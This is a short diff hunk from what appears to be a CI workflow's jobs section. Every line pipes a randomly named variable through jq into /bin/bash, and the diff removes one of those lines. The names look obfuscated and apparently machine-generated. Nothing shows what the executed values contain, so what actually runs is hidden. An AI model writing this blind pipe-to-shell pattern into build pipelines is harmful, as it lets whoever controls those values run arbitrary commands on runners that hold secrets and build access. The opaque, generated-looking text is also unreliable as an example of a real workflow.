@@ -28,7 +28,6 @@ jobs:
           echo $pss60468 | jq -r .pbip8603 | /bin/bash
           printf '%s' "$y62" | jq -r .qzdy79 | /bin/bash
           echo $wgmpv5036 | jq -r .vpvm6 | /bin/bash
-          echo $qhtfd4740 | jq -r .zbdfw5 | /bin/bash
           printf '%s' "$bbeix2" | jq -r .sfb69848 | /bin/bash
           printf '%s' "$gw2" | jq -r .zkpen54 | /bin/bash
           echo $t6 | jq -r .mf485 | /bin/bash
